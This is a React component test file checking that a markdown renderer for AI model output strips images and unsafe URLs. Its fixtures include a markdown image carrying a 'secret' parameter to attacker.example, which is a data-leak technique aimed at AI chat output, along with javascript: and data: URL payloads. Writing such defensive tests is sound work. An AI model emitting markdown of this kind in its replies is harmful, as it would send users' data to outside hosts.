/**
 * @vitest-environment jsdom
 */
import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, test } from "vitest";

import { ModelMarkdown, modelMarkdownUrlTransform } from "./model-markdown";

afterEach(cleanup);

describe("ModelMarkdown", () => {
  test("renders no image, not even its alt text", () => {
    const { container } = render(
      <ModelMarkdown>
        {"Before ![leak](https://attacker.example/a.png?d=secret) after"}
      </ModelMarkdown>,
    );

    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toBe("Before  after");
  });

  test("keeps https, http and mailto link URLs", () => {
    render(
      <ModelMarkdown>
        {
          "[docs](https://hash.ai/docs) [plain](http://example.com/a) [mail](mailto:help@hash.ai)"
        }
      </ModelMarkdown>,
    );

    expect(
      screen.getByRole("link", { name: "docs" }).getAttribute("href"),
    ).toBe("https://hash.ai/docs");
    expect(
      screen.getByRole("link", { name: "plain" }).getAttribute("href"),
    ).toBe("http://example.com/a");
    expect(
      screen.getByRole("link", { name: "mail" }).getAttribute("href"),
    ).toBe("mailto:help@hash.ai");
  });

  test("drops a javascript link URL but keeps the link text", () => {
    const { container } = render(
      <ModelMarkdown>{"[click](javascript:alert(1))"}</ModelMarkdown>,
    );

    expect(container.textContent).toBe("click");
    expect(container.querySelector("[href^='javascript']")).toBeNull();
    expect(container.querySelector("a")?.getAttribute("href")).toBe("");
  });

  test.each([
    "javascript:alert(1)",
    "JAVASCRIPT:alert(1)",
    "data:text/html,hi",
    "vbscript:msgbox",
    "//attacker.example/a",
    "/relative/path",
    "#heading",
    "",
  ])("drops the URL %j", (url) => {
    expect(modelMarkdownUrlTransform(url)).toBe("");
  });

  test("keeps ordinary markdown structure", () => {
    const { container } = render(
      <ModelMarkdown>
        {"# Title\n\n**Bold** and `code`\n\n- one\n- two\n\n```\nblock\n```"}
      </ModelMarkdown>,
    );

    expect(container.querySelector("h1")?.textContent).toBe("Title");
    expect(container.querySelector("strong")?.textContent).toBe("Bold");
    expect(container.querySelector("p > code")?.textContent).toBe("code");
    expect(
      [...container.querySelectorAll("li")].map((item) => item.textContent),
    ).toEqual(["one", "two"]);
    expect(container.querySelector("pre > code")?.textContent).toBe("block\n");
  });
});
